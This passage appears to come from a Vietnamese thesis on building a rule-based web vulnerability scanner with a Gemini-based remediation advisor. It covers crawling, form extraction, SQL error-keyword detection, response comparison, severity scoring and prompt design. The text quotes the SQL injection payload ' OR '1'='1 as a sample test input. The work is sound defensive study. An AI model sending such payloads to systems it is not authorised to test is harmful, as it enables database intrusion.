Hai thuật toán duyệt đồ thị cơ bản được áp dụng trong web crawling là Breadth-First Search (BFS) và Depth-First Search (DFS), mỗi thuật toán có đặc điểm riêng phù hợp với các mục đích crawling khác nhau. BFS hay duyệt theo chiều rộng hoạt động bằng cách duyệt tất cả các trang ở cùng một mức độ sâu trước khi chuyển sang mức tiếp theo, sử dụng cấu trúc dữ liệu hàng đợi (queue) để quản lý thứ tự duyệt theo nguyên tắc FIFO. Bắt đầu từ URL gốc ở mức 0, BFS phát hiện và thêm tất cả liên kết trên trang đó vào hàng đợi ở mức 1, sau khi duyệt hết các trang mức 1 thì thuật toán tiếp tục với các liên kết phát hiện được ở mức 2, và cứ tiếp tục cho đến khi đạt giới hạn độ sâu hoặc hết liên kết mới để duyệt. Cách tiếp cận này đảm bảo phát hiện các trang quan trọng gần trang chủ trước, dễ kiểm soát độ sâu crawl thông qua depth limit và phù hợp cho việc quét toàn diện trong phạm vi giới hạn, mặc dù tiêu tốn nhiều bộ nhớ hơn khi số lượng trang ở mỗi mức lớn vì phải lưu trữ toàn bộ frontier (tập các URL chờ duyệt).

DFS hay duyệt theo chiều sâu hoạt động ngược lại với BFS bằng cách đi sâu vào một nhánh cho đến khi không còn liên kết mới rồi quay lại (backtrack) để duyệt nhánh tiếp theo, thuật toán sử dụng ngăn xếp hoặc đệ quy để lưu trữ trạng thái duyệt. DFS tiêu tốn ít bộ nhớ hơn BFS vì chỉ cần lưu trữ đường đi hiện tại từ gốc đến nút đang xét, đồng thời nhanh chóng đạt đến các trang sâu trong cấu trúc website. Tuy nhiên DFS có thể bị mắc kẹt trong các nhánh sâu vô hạn nếu không có giới hạn độ sâu rõ ràng, đặc biệt với các website có cấu trúc phức tạp như calendar hoặc pagination vô tận, và không đảm bảo phát hiện các trang quan trọng ở mức nông trước khi chuyển sang các trang sâu ít quan trọng hơn.

Đề tài lựa chọn thuật toán BFS vì phù hợp với yêu cầu kiểm soát độ sâu crawl trong khoảng 2-3 mức, đảm bảo phát hiện đầy đủ các trang và biểu mẫu chức năng chính của ứng dụng mục tiêu, đồng thời dễ triển khai và debug trong môi trường học thuật. Pseudocode của thuật toán BFS crawling được mô tả như sau:

```
function bfs_crawl(start_url, max_depth):
    queue = [(start_url, 0)]
    visited = {start_url}
    results = []

    while queue is not empty:
        current_url, depth = queue.dequeue()
        if depth > max_depth:
            continue
        
        response = fetch(current_url)
        links = extract_links(response)
        forms = extract_forms(response)
        results.append({url: current_url, forms: forms})
        
        for link in links:
            if link not in visited and is_same_domain(link):
                visited.add(link)
                queue.enqueue((link, depth + 1))
    
    return results
```

### 2.3.2. Trích xuất liên kết và biểu mẫu (HTML Parsing)

Sau khi tải nội dung HTML của một trang web, crawler cần phân tích cú pháp (parse) để trích xuất các thông tin cần thiết phục vụ quá trình quét. HTML parsing là quá trình chuyển đổi chuỗi HTML thô thành cấu trúc cây DOM (Document Object Model), cho phép truy vấn và trích xuất các phần tử cụ thể một cách có hệ thống. Trong Python, thư viện BeautifulSoup được sử dụng rộng rãi cho mục đích này nhờ API đơn giản và khả năng xử lý HTML không hoàn chỉnh (malformed HTML) mà các trình duyệt thực tế thường gặp, vì trên thực tế nhiều trang web không tuân thủ chặt chẽ chuẩn HTML nhưng trình duyệt vẫn render được nhờ cơ chế parse linh hoạt.

Quá trình trích xuất liên kết tập trung vào việc tìm tất cả thẻ `<a>` trong HTML và lấy giá trị thuộc tính href. Tuy nhiên giá trị href có thể ở dạng URL tương đối (relative URL) như `/vulnerabilities/sqli/` hoặc `../about.html`, cần được chuyển đổi thành URL tuyệt đối (absolute URL) bằng cách kết hợp với base URL của trang hiện tại trước khi sử dụng cho các bước tiếp theo. Thư viện urllib.parse trong Python cung cấp hàm urljoin để thực hiện việc này một cách chính xác theo chuẩn URL resolution. Sau khi có danh sách URL tuyệt đối, crawler cần lọc bỏ các liên kết không phù hợp với mục đích quét bao gồm liên kết ngoài domain mục tiêu, liên kết logout có thể gây mất phiên đăng nhập trong quá trình crawl, anchor links chỉ khác phần fragment của URL hiện tại, và liên kết đến file tải về như PDF hoặc hình ảnh không có ý nghĩa kiểm thử bảo mật.

Trích xuất biểu mẫu là nhiệm vụ quan trọng hơn trong ngữ cảnh quét lỗ hổng vì biểu mẫu là vector tấn công chính của các lỗ hổng injection. Với mỗi thẻ `<form>` tìm được, crawler cần thu thập action URL xác định đường dẫn xử lý biểu mẫu, method xác định phương thức gửi GET hoặc POST, và danh sách tất cả các trường đầu vào bao gồm tên (name), kiểu (type) và giá trị mặc định (value) của từng trường. Đặc biệt các trường ẩn (hidden fields) thường chứa CSRF token cần được trích xuất và gửi kèm trong request kiểm thử để đảm bảo request không bị server từ chối với lỗi xác thực token. Ví dụ triển khai bằng BeautifulSoup được trình bày dưới đây:

```python
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def extract_forms(html_content, base_url):
    soup = BeautifulSoup(html_content, 'html.parser')
    forms = []
    
    for form in soup.find_all('form'):
        form_data = {
            'action': urljoin(base_url, form.get('action', '')),
            'method': form.get('method', 'GET').upper(),
            'inputs': []
        }
        
        for input_tag in form.find_all(['input', 'textarea', 'select']):
            input_data = {
                'name': input_tag.get('name', ''),
                'type': input_tag.get('type', 'text'),
                'value': input_tag.get('value', '')
            }
            form_data['inputs'].append(input_data)
        
        forms.append(form_data)
    
    return forms
```

### 2.3.3. Xử lý phạm vi crawl

Để đảm bảo crawler hoạt động hiệu quả, không vượt quá phạm vi cho phép và không gây ảnh hưởng tiêu cực đến hệ thống mục tiêu, cần áp dụng nhiều cơ chế kiểm soát đồng thời. Giới hạn cùng domain (same-domain restriction) là quy tắc cơ bản nhất, yêu cầu crawler chỉ duyệt các URL có cùng domain với URL mục tiêu ban đầu. Quy tắc này ngăn chặn việc crawler đi lạc sang các website bên ngoài không liên quan, vừa lãng phí tài nguyên vừa có thể vi phạm quy định pháp lý khi quét website không được phép kiểm thử. Việc kiểm tra domain được thực hiện bằng cách so sánh phần netloc của URL đã parse với domain mục tiêu thông qua thư viện urllib.parse.

Giới hạn độ sâu (depth limit) xác định số mức liên kết tối đa mà crawler đi sâu từ trang khởi đầu, giá trị thường dùng trong đề tài là 2-3 mức đủ để phát hiện các trang chức năng chính của ứng dụng web mà không quá tải hệ thống hoặc mất quá nhiều thời gian. Theo quy ước, trang chủ ở mức 0, các trang liên kết trực tiếp từ trang chủ ở mức 1, các trang liên kết từ mức 1 ở mức 2, và cứ tiếp tục như vậy. Loại bỏ trùng lặp (URL deduplication) sử dụng cấu trúc dữ liệu tập hợp (set) để theo dõi các URL đã duyệt, trước khi thêm một URL mới vào hàng đợi crawler kiểm tra xem URL đó đã tồn tại trong tập visited hay chưa. Cơ chế này ngăn chặn việc crawl lại cùng một trang nhiều lần và đặc biệt quan trọng trong việc phá vỡ các vòng lặp vô hạn khi hai trang liên kết qua lại lẫn nhau hoặc khi có liên kết tự tham chiếu trong cấu trúc website.

Xử lý phiên đăng nhập là yêu cầu thiết yếu khi crawl các ứng dụng web yêu cầu xác thực vì nhiều trang chức năng chỉ có thể truy cập sau khi đăng nhập, và nếu crawler không duy trì phiên đăng nhập thì nó sẽ bị chuyển hướng về trang login thay vì truy cập được nội dung thực sự. Crawler cần có khả năng thực hiện đăng nhập tự động bằng cách gửi credentials qua form login, duy trì session cookie trong suốt quá trình crawl thông qua cơ chế cookie jar của thư viện requests, và xử lý CSRF token bằng cách trích xuất token từ form trước khi gửi request POST. Trong trường hợp DVWA, crawler cần gửi kèm cookie PHPSESSID để duy trì phiên và cookie security để xác định mức độ bảo mật đang kiểm thử (low, medium hoặc high), đồng thời cần xử lý user_token CSRF được DVWA sử dụng trên hầu hết các form ở mức security medium và high.

## 2.4. Kỹ thuật phát hiện lỗ hổng tự động

### 2.4.1. Quy trình scanner

Một hệ thống quét lỗ hổng web tự động hoạt động theo quy trình bốn giai đoạn tuần tự gồm Crawl, Test, Analyze và Report, mỗi giai đoạn đảm nhận một nhiệm vụ cụ thể và cung cấp đầu ra cho giai đoạn tiếp theo trong pipeline. Giai đoạn Crawl là bước khởi đầu, trong đó hệ thống duyệt website mục tiêu để xây dựng bản đồ ứng dụng. Crawler phát hiện các trang có thể truy cập, trích xuất biểu mẫu và xác định các điểm nhập dữ liệu (injection points) bao gồm URL parameters, form fields, cookies và HTTP headers. Kết quả của giai đoạn này là danh sách đầy đủ các mục tiêu kiểm thử, mỗi mục tiêu bao gồm URL, phương thức HTTP, tên tham số và giá trị mặc định để giai đoạn tiếp theo có thể sử dụng làm cơ sở xây dựng request kiểm thử.

Giai đoạn Test tiếp nhận danh sách mục tiêu từ giai đoạn Crawl và tiến hành gửi các payload kiểm thử đến từng điểm nhập dữ liệu. Mỗi loại lỗ hổng có bộ payload riêng được thiết kế để kích hoạt hành vi bất thường nếu lỗ hổng tồn tại, đối với SQL Injection payload bao gồm các chuỗi chứa ký tự đặc biệt SQL như dấu nháy đơn, toán tử logic OR và comment syntax, còn đối với XSS payload chứa các thẻ HTML và mã JavaScript. Với mỗi payload được gửi, hệ thống thu thập đầy đủ response bao gồm mã trạng thái HTTP, headers và body để phục vụ phân tích ở giai đoạn sau, đồng thời cũng cần ghi nhận response baseline khi gửi giá trị bình thường để làm cơ sở so sánh.

Giai đoạn Analyze là trung tâm logic của hệ thống, nơi các response thu được từ giai đoạn Test được so sánh với response bình thường (baseline) và đánh giá theo các quy tắc phát hiện đã được định nghĩa trước. Hệ thống áp dụng nhiều chiến lược phân tích đồng thời để xác định dấu hiệu lỗ hổng, bao gồm tìm kiếm từ khóa lỗi trong response body, so sánh độ dài nội dung giữa response kiểm thử và baseline, và theo dõi thay đổi mã trạng thái HTTP. Kết quả phân tích từ các chiến lược khác nhau được tổng hợp thành điểm severity để đánh giá mức độ nghiêm trọng và độ tin cậy của phát hiện, từ đó tránh tình trạng báo cáo sai do chỉ dựa vào một tiêu chí đơn lẻ.

Giai đoạn Report tổng hợp tất cả kết quả phát hiện thành báo cáo có cấu trúc, trình bày thông tin chi tiết cho mỗi lỗ hổng bao gồm URL bị ảnh hưởng, tham số dễ bị tấn công, payload đã kích hoạt lỗ hổng, bằng chứng trong response và mức độ nghiêm trọng được đánh giá. Trong đề tài này, giai đoạn Report được mở rộng đáng kể bằng việc tích hợp AI để bổ sung giải thích nguyên nhân và khuyến nghị khắc phục cho mỗi lỗ hổng phát hiện được, biến báo cáo từ một danh sách kỹ thuật khô khan thành tài liệu hỗ trợ học tập và sửa lỗi có giá trị thực tiễn cao hơn.

### 2.4.2. Phương pháp phát hiện dựa trên luật

Phương pháp phát hiện dựa trên luật (rule-based detection) sử dụng các quy tắc được định nghĩa trước bởi chuyên gia bảo mật để xác định sự tồn tại của lỗ hổng. Mỗi quy tắc mô tả một pattern hoặc điều kiện cụ thể mà khi thỏa mãn, hệ thống kết luận có khả năng tồn tại lỗ hổng tại điểm đang kiểm thử. Ví dụ điển hình là quy tắc "nếu response chứa chuỗi 'You have an error in your SQL syntax' sau khi gửi payload chứa dấu nháy đơn, thì có khả năng tồn tại SQL Injection error-based", quy tắc này khai thác hiện tượng nhiều ứng dụng để lộ thông báo lỗi database khi gặp truy vấn không hợp lệ.

Phương pháp rule-based có nhiều ưu điểm phù hợp với mục đích của đề tài. Trước hết, kết quả phát hiện có thể giải thích được (explainable) vì mỗi phát hiện đều gắn liền với một quy tắc cụ thể có logic rõ ràng, người dùng có thể truy xuất ngược về quy tắc đã kích hoạt phát hiện đó để hiểu lý do tại sao hệ thống báo cáo lỗ hổng. Phương pháp này cũng không cần dữ liệu huấn luyện, khác với các phương pháp machine learning đòi hỏi tập dữ liệu lớn được gán nhãn và quá trình training phức tạp tốn nhiều thời gian và tài nguyên tính toán. Việc triển khai tương đối đơn giản giúp phương pháp rule-based phù hợp cho mục đích học thuật và xây dựng prototype, trong khi các quy tắc có thể được bổ sung và chỉnh sửa dễ dàng khi cần mở rộng khả năng phát hiện cho các loại lỗ hổng hoặc biến thể payload mới.

Tuy nhiên phương pháp rule-based cũng có những hạn chế cần nhận thức rõ ràng. Độ bao phủ của hệ thống phụ thuộc hoàn toàn vào chất lượng và số lượng quy tắc được định nghĩa, dẫn đến khả năng bỏ sót các biến thể mới hoặc kỹ thuật tấn công chưa được mô tả trong bộ luật, đặc biệt với các kỹ thuật bypass tinh vi do các nhà nghiên cứu bảo mật phát triển liên tục. Phương pháp này cũng có thể tạo ra kết quả dương tính giả (false positives) khi pattern trùng khớp ngẫu nhiên với nội dung hợp lệ trong trang, ví dụ một blog kỹ thuật thảo luận về SQL Injection có thể chứa các từ khóa lỗi SQL trong nội dung bài viết và bị nhận diện sai là lỗ hổng. Ngược lại, âm tính giả (false negatives) xảy ra khi lỗ hổng tồn tại nhưng không khớp với bất kỳ quy tắc nào trong bộ luật. Để giảm thiểu false positives, đề tài áp dụng chiến lược kết hợp nhiều tiêu chí phát hiện và tính điểm tổng hợp thay vì dựa vào một tiêu chí đơn lẻ.

### 2.4.3. So sánh response và phát hiện lỗ hổng

Đề tài sử dụng ba chiến lược phân tích response, mỗi chiến lược khai thác một khía cạnh khác nhau của phản hồi server để phát hiện dấu hiệu lỗ hổng và bổ sung lẫn nhau trong việc tăng độ tin cậy phát hiện.

Chiến lược Error-based Detection tìm kiếm các thông báo lỗi đặc trưng của hệ quản trị cơ sở dữ liệu trong response body. Khi payload SQL Injection gây ra lỗi cú pháp SQL, nhiều ứng dụng web đặc biệt trong môi trường development hoặc cấu hình không an toàn trả về thông báo lỗi chi tiết chứa thông tin về hệ thống database. Hệ thống duy trì một danh sách các từ khóa lỗi đặc trưng cho từng hệ quản trị, ví dụ MySQL có các pattern như "You have an error in your SQL syntax", "mysql_fetch", "Warning: mysql"; PostgreSQL có "pg_query", "ERROR: syntax error"; Microsoft SQL Server có "Microsoft OLE DB", "ODBC SQL Server", "Unclosed quotation mark"; Oracle có "ORA-", "quoted string not properly terminated"; và SQLite có "SQLite3::", "SQLITE_ERROR", "unrecognized token". Khi bất kỳ từ khóa nào xuất hiện trong response sau khi gửi payload, hệ thống đánh giá đây là bằng chứng mạnh cho sự tồn tại của SQL Injection error-based vì các từ khóa này gần như chỉ xuất hiện khi truy vấn SQL gặp lỗi.

```python
SQL_ERROR_KEYWORDS = [
    'sql syntax', 'mysql', 'sqlite', 'postgresql',
    'oracle', 'microsoft ole db', 'odbc',
    'syntax error', 'query failed', 'database error'
]

def detect_sql_error(response_text):
    response_lower = response_text.lower()
    for keyword in SQL_ERROR_KEYWORDS:
        if keyword in response_lower:
            return True, keyword
    return False, None
```

Chiến lược Content Length Anomaly so sánh độ dài response khi gửi payload kiểm thử với độ dài response bình thường (baseline). Ý tưởng cơ bản là nếu payload thay đổi logic truy vấn SQL thì kết quả trả về sẽ khác biệt đáng kể so với trường hợp bình thường. Ví dụ payload `' OR '1'='1` có thể khiến truy vấn trả về toàn bộ bản ghi trong bảng thay vì chỉ một bản ghi, dẫn đến response dài hơn đáng kể so với baseline. Ngược lại payload gây lỗi có thể khiến server trả về trang lỗi ngắn gọn thay vì nội dung đầy đủ với toàn bộ giao diện và dữ liệu. Hệ thống tính tỷ lệ chênh lệch giữa độ dài response kiểm thử và baseline, nếu vượt quá ngưỡng thường là 30% thì đánh giá đây là dấu hiệu bất thường cần lưu ý và đưa vào tổng điểm severity.

```python
def detect_content_anomaly(baseline_length, test_length, threshold=0.3):
    if baseline_length == 0:
        return False
    difference = abs(test_length - baseline_length) / baseline_length
    return difference > threshold
```

Chiến lược Status Code Change theo dõi sự thay đổi mã trạng thái HTTP giữa request bình thường và request chứa payload. Trong hoạt động bình thường một trang web trả về mã 200 OK, nếu payload gây ra lỗi xử lý phía server thì mã trạng thái có thể chuyển thành 500 Internal Server Error cho thấy server đã gặp exception khi xử lý truy vấn chứa payload. Nếu ứng dụng có cơ chế phát hiện tấn công thì mã trạng thái có thể chuyển thành 403 Forbidden hoặc 302 Found dạng chuyển hướng đến trang cảnh báo. Sự thay đổi mã trạng thái không đủ để kết luận lỗ hổng tồn tại vì có thể do nhiều nguyên nhân khác như rate limiting hay lỗi tạm thời, nhưng là bằng chứng bổ sung có giá trị khi kết hợp với các chiến lược khác để tăng độ tin cậy của phát hiện.

Để nâng cao độ chính xác và giảm false positives, hệ thống kết hợp kết quả từ cả ba chiến lược thông qua cơ chế tính điểm tổng hợp (multi-strategy scoring). Mỗi chiến lược đóng góp một số điểm nhất định vào tổng điểm severity, trong đó error-based đóng góp 40 điểm vì là bằng chứng mạnh nhất với độ chính xác cao, content anomaly đóng góp 35 điểm vì có thể bị ảnh hưởng bởi các yếu tố ngẫu nhiên, và status code change đóng góp 25 điểm vì có nhiều nguyên nhân không liên quan đến lỗ hổng. Một lỗ hổng chỉ được báo cáo ở mức High khi tổng điểm đạt 60 trở lên (tức là có ít nhất hai chiến lược xác nhận đồng thời), mức Medium khi đạt 35-59 điểm, và mức Low khi có ít nhất một dấu hiệu được phát hiện. Cách tiếp cận tổng hợp này giảm đáng kể khả năng báo cáo sai so với việc dựa vào một tiêu chí đơn lẻ và phù hợp với nguyên tắc defense in depth trong bảo mật.

```python
def calculate_severity(error_found, content_anomaly, status_changed):
    score = 0
    if error_found:
        score += 40
    if content_anomaly:
        score += 35
    if status_changed:
        score += 25
    
    if score >= 60:
        return "High"
    elif score >= 35:
        return "Medium"
    elif score > 0:
        return "Low"
    return "None"
```

## 2.5. Trí tuệ nhân tạo sinh (Generative AI)

### 2.5.1. Mô hình ngôn ngữ lớn (LLM)

Mô hình ngôn ngữ lớn (Large Language Model) là một loại mô hình trí tuệ nhân tạo được huấn luyện trên lượng dữ liệu văn bản khổng lồ từ internet, sách, tài liệu kỹ thuật và nhiều nguồn khác, có khả năng hiểu ngữ cảnh và sinh ngôn ngữ tự nhiên với chất lượng gần như con người. LLM hoạt động dựa trên kiến trúc Transformer được giới thiệu trong bài báo "Attention Is All You Need" của Vaswani và cộng sự năm 2017, sử dụng cơ chế self-attention để nắm bắt mối quan hệ ngữ nghĩa giữa các từ trong ngữ cảnh dài mà không bị giới hạn bởi khoảng cách vị trí như các kiến trúc tuần tự trước đó dựa trên RNN hay LSTM. Sự phát triển của Transformer đã tạo nên bước nhảy vọt trong lĩnh vực xử lý ngôn ngữ tự nhiên, mở đường cho các mô hình quy mô lớn hiện đại với năng lực vượt xa các phương pháp truyền thống.

Kiến trúc Transformer bao gồm hai thành phần chính là Encoder mã hóa chuỗi đầu vào thành biểu diễn vector trong không gian ngữ nghĩa, và Decoder sinh chuỗi đầu ra dựa trên biểu diễn từ encoder và các token đã sinh trước đó. Các LLM hiện đại thường sử dụng kiến trúc decoder-only như dòng GPT của OpenAI, trong đó mô hình được huấn luyện để dự đoán token tiếp theo dựa trên chuỗi token trước đó theo cơ chế language modeling. Quá trình sinh văn bản diễn ra theo cơ chế autoregressive khi mô hình sinh từng token một và mỗi token mới được sinh dựa trên toàn bộ chuỗi đã có trước đó, tạo ra văn bản mạch lạc và phù hợp với ngữ cảnh. Với số lượng tham số từ hàng tỷ đến hàng trăm tỷ và lượng dữ liệu huấn luyện khổng lồ, LLM thể hiện khả năng emergent behaviors là các khả năng phức tạp xuất hiện khi mô hình đạt đến quy mô đủ lớn mà không được lập trình trực tiếp, ví dụ khả năng giải toán, suy luận đa bước hay hiểu ngữ cảnh phức tạp.

Trong lĩnh vực bảo mật thông tin, LLM thể hiện nhiều khả năng có giá trị ứng dụng. Về giải thích lỗ hổng, LLM có thể mô tả nguyên nhân, cơ chế hoạt động và tác động tiềm tàng của lỗ hổng bằng ngôn ngữ dễ hiểu phù hợp với trình độ của người đọc, từ đó hỗ trợ người dùng không chuyên về bảo mật vẫn có thể nắm bắt được bản chất của vấn đề. Về đề xuất khắc phục, LLM có thể cung cấp hướng dẫn sửa lỗi cụ thể kèm mã nguồn minh họa cho nhiều ngôn ngữ lập trình và framework khác nhau, điều mà các công cụ truyền thống khó làm được do chi phí biên soạn nội dung tư vấn cho từng tình huống là rất lớn. Về phân tích ngữ cảnh, LLM hiểu bối cảnh kỹ thuật bao gồm ngôn ngữ lập trình đang sử dụng, framework, loại lỗ hổng và môi trường triển khai để đưa ra tư vấn phù hợp với từng tình huống cụ thể. Về hỏi đáp tương tác, LLM có thể duy trì cuộc hội thoại nhiều lượt, trả lời câu hỏi bổ sung và làm rõ các khái niệm khi người dùng cần đào sâu vào chi tiết kỹ thuật hoặc các tình huống biến thể.

Các mô hình LLM phổ biến hiện nay bao gồm GPT-4 của OpenAI với khả năng suy luận mạnh và hỗ trợ đa phương thức, Gemini của Google DeepMind tích hợp sâu vào hệ sinh thái Google với SDK chính thức cho nhiều ngôn ngữ, Claude của Anthropic tập trung vào tính an toàn và hữu ích trong các tình huống nhạy cảm, DeepSeek của DeepSeek AI là mô hình mã nguồn mở với hiệu suất cao trên nhiều benchmark, và LLaMA của Meta cũng là mã nguồn mở phù hợp cho nghiên cứu học thuật. Đề tài lựa chọn tích hợp Gemini làm provider chính do có SDK Python chính thức dễ sử dụng, tier miễn phí phù hợp cho mục đích học thuật không yêu cầu chi phí ban đầu, và chất lượng phản hồi tốt cho các tác vụ phân tích kỹ thuật như giải thích lỗ hổng và đề xuất khắc phục.

Tuy nhiên LLM cũng có những hạn chế cần nhận thức khi tích hợp vào hệ thống. Hiện tượng hallucination khiến LLM có thể sinh ra thông tin không chính xác hoặc bịa đặt nhưng trình bày một cách tự tin và mạch lạc, đòi hỏi người dùng phải xác minh thông tin trước khi áp dụng vào môi trường thực tế đặc biệt với các đề xuất sửa code có thể ảnh hưởng đến hệ thống đang vận hành. Kiến thức của LLM bị giới hạn bởi thời điểm cắt dữ liệu huấn luyện (cutoff date) nên có thể thiếu thông tin về các lỗ hổng zero-day mới được công bố hoặc các kỹ thuật phòng chống mới phát triển. Chất lượng đầu ra phụ thuộc lớn vào cách thiết kế prompt đầu vào, prompt không rõ ràng hoặc thiếu ngữ cảnh sẽ dẫn đến phản hồi chung chung và ít giá trị thực tiễn, đây là lý do prompt engineering trở thành kỹ năng quan trọng khi tích hợp LLM vào ứng dụng. Cuối cùng việc sử dụng LLM qua API có chi phí theo số lượng token xử lý, cần được cân nhắc trong thiết kế hệ thống để tối ưu chi phí và tránh vượt quota khi scaling.

### 2.5.2. Prompt Engineering cho lĩnh vực bảo mật

Prompt Engineering là kỹ thuật thiết kế và tối ưu hóa câu lệnh đầu vào (prompt) để hướng dẫn LLM tạo ra đầu ra có chất lượng cao, đúng định dạng và phù hợp với mục đích sử dụng cụ thể. Trong lĩnh vực bảo mật web, prompt engineering đóng vai trò then chốt trong việc đảm bảo AI cung cấp thông tin chính xác về mặt kỹ thuật, có cấu trúc rõ ràng để hệ thống xử lý tự động, và phù hợp với ngữ cảnh cụ thể của từng lỗ hổng được phát hiện. Một prompt được thiết kế tốt có thể nâng cao đáng kể chất lượng phản hồi của cùng một mô hình LLM so với prompt sơ sài, biến mô hình từ một công cụ trả lời chung chung thành chuyên gia phân tích bảo mật trong từng tình huống cụ thể.

Nguyên tắc đầu tiên trong thiết kế prompt cho bảo mật là xác định vai trò (Role Assignment) cho mô hình. Việc gán cho LLM một persona cụ thể giúp định hướng phong cách ngôn ngữ, mức độ chi tiết kỹ thuật và góc nhìn phân tích. Trong đề tài, LLM được gán vai trò "senior web security expert specializing in vulnerability analysis and remediation", hướng dẫn mô hình tập trung vào phân tích chuyên sâu và đề xuất khắc phục thay vì mô tả cách khai thác lỗ hổng. Vai trò này cũng ngầm định rằng đầu ra cần mang tính chuyên nghiệp, chính xác về mặt kỹ thuật và phù hợp cho mục đích giáo dục, đồng thời giúp mô hình tự nhiên áp dụng các best practices của ngành bảo mật mà không cần liệt kê tường minh trong prompt.

Nguyên tắc thứ hai là cung cấp ngữ cảnh đầy đủ (Context Provision) trong prompt. Prompt cần chứa đủ thông tin về lỗ hổng để AI có cơ sở phân tích chính xác, bao gồm loại lỗ hổng, URL bị ảnh hưởng, tham số dễ bị tấn công, payload đã sử dụng, bằng chứng phát hiện trong response và phương thức HTTP. Thiếu ngữ cảnh sẽ khiến AI đưa ra phân tích chung chung không gắn với tình huống cụ thể và ít giá trị thực tiễn, ngược lại ngữ cảnh quá dài và dư thừa có thể gây nhiễu, làm loãng các thông tin quan trọng và tăng chi phí API không cần thiết. Việc cân bằng giữa đầy đủ và súc tích trong cung cấp ngữ cảnh là một nghệ thuật cần kinh nghiệm để hoàn thiện.

Nguyên tắc thứ ba là định dạng đầu ra (Output Format Specification) một cách cụ thể. Yêu cầu LLM trả về kết quả theo cấu trúc JSON cụ thể giúp hệ thống parse và hiển thị tự động mà không cần xử lý văn bản tự do phức tạp với nhiều biến thể format. Cấu trúc đầu ra trong đề tài được thiết kế bao gồm các trường vulnerability_name là tên lỗ hổng, severity là mức độ nghiêm trọng, explanation là giải thích nguyên nhân, impact là tác động tiềm tàng, remediation là các bước khắc phục, và code_example là mã nguồn minh họa cách sửa lỗi. Cấu trúc này tương thích với schema dữ liệu của module hiển thị kết quả, cho phép tích hợp liền mạch giữa AI advisor và giao diện người dùng.

Nguyên tắc thứ tư là giới hạn phạm vi (Scope Limitation) trong prompt. Prompt cần hướng dẫn rõ ràng rằng AI chỉ tập trung vào biện pháp phòng thủ và khắc phục, không cung cấp kỹ thuật khai thác nâng cao hoặc phương pháp leo thang tấn công. Điều này đảm bảo hệ thống phục vụ mục đích giáo dục và bảo vệ chứ không trở thành công cụ hỗ trợ tấn công khi rơi vào tay người sử dụng có ý đồ xấu. Prompt cũng chỉ định ngữ cảnh giáo dục phù hợp cho lập trình viên đang học về bảo mật web, từ đó định hướng mô hình giải thích các khái niệm cơ bản khi cần thiết thay vì giả định người đọc đã có kiến thức chuyên sâu.

Nguyên tắc thứ năm là sử dụng ví dụ mẫu (Few-shot Examples) khi cần thiết. Cung cấp một hoặc vài ví dụ về đầu ra mong muốn giúp LLM hiểu rõ kỳ vọng về cấu trúc, mức độ chi tiết và phong cách trình bày một cách trực quan hơn so với chỉ mô tả bằng lời. Kỹ thuật few-shot đặc biệt hiệu quả khi cần đầu ra tuân theo format cụ thể mà chỉ mô tả bằng lời khó truyền đạt chính xác, ví dụ khi muốn chuẩn hóa cách trình bày các bước khắc phục hoặc cách viết code example. Tuy nhiên few-shot examples cũng làm tăng độ dài prompt nên cần cân nhắc khi áp dụng để không vượt quá giới hạn token của mô hình.

Áp dụng các nguyên tắc trên, cấu trúc prompt hoàn chỉnh được sử dụng trong hệ thống có dạng:

```python
def build_analysis_prompt(vulnerability_data):
    prompt = f"""
    You are a web security expert. Analyze the following vulnerability 
    and provide remediation advice.
    
    ## Vulnerability Information
    Type: {vulnerability_data['type']}
    URL: {vulnerability_data['url']}
    Parameter: {vulnerability_data['parameter']}
    Payload: {vulnerability_data['payload']}
    Evidence: {vulnerability_data['evidence']}
    
    ## Required Output (JSON format)
    {{
        "explanation": "Why this vulnerability exists",
        "impact": "What an attacker could achieve",
        "severity": "High/Medium/Low",
        "remediation_steps": ["step1", "step2"],
        "secure_code_example": "Code snippet showing the fix"
    }}
    
    Focus on educational explanation and defensive measures only.
    """
    return prompt
```

### 2.5.3. Tương tác với API của LLM

Các LLM thương mại và mã nguồn mở đều cung cấp API cho phép ứng dụng bên ngoài gửi prompt và nhận phản hồi thông qua giao thức HTTP. Việc tích hợp LLM vào hệ thống quét lỗ hổng được thực hiện thông qua các API này với luồng xử lý cơ bản gồm hệ thống scanner xây dựng prompt từ dữ liệu lỗ hổng, gửi prompt đến API endpoint của LLM provider, nhận response chứa nội dung phân tích, parse response thành cấu trúc dữ liệu và hiển thị cho người dùng. Toàn bộ quá trình này thường diễn ra trong vài giây, đủ để cung cấp phản hồi gần như thời gian thực cho người dùng.

Google Gemini cung cấp SDK chính thức cho Python tên là google-generativeai, cho phép tương tác với mô hình thông qua vài dòng mã ngắn gọn. Quy trình cơ bản bao gồm cấu hình API key, khởi tạo model instance và gọi phương thức generate_content với prompt đầu vào, SDK sẽ xử lý tự động các chi tiết kỹ thuật như serialization, HTTP connection management và error handling cơ bản giúp lập trình viên tập trung vào logic ứng dụng thay vì các vấn đề tầng thấp của giao thức.

```python
import google.generativeai as genai

genai.configure(api_key="YOUR_API_KEY")
model = genai.GenerativeModel('gemini-pro')
response = model.generate_content(prompt)
result = response.text
```

Ngoài SDK, việc tương tác cũng có thể thực hiện trực tiếp qua REST API sử dụng thư viện requests. Cách tiếp cận này linh hoạt hơn vì cho phép kiểm soát chi tiết các tham số request và phù hợp khi cần tích hợp với nhiều provider khác nhau thông qua interface thống nhất, đồng thời không phụ thuộc vào SDK của từng provider cụ thể có thể gây khó khăn khi nâng cấp hoặc thay đổi provider.

Các tham số quan trọng khi gọi API ảnh hưởng trực tiếp đến chất lượng và tính nhất quán của đầu ra. Temperature kiểm soát mức độ ngẫu nhiên trong quá trình sinh token, giá trị thấp trong khoảng 0.2 đến 0.4 cho kết quả nhất quán và tập trung phù hợp cho phân tích kỹ thuật yêu cầu độ chính xác cao, trong khi giá trị cao từ 0.7 đến 1.0 cho kết quả đa dạng và sáng tạo hơn phù hợp cho các tác vụ như viết nội dung quảng cáo. Max_tokens giới hạn độ dài phản hồi và cần đặt đủ lớn từ 1000 đến 2000 tokens để AI có không gian trình bày đầy đủ các phân tích chi tiết nhưng không quá lớn gây lãng phí chi phí và thời gian xử lý. Top_p hay nucleus sampling kiểm soát tập từ vựng được xem xét khi sinh token, giá trị 0.8 đến 0.95 cân bằng giữa chất lượng và đa dạng phản hồi.

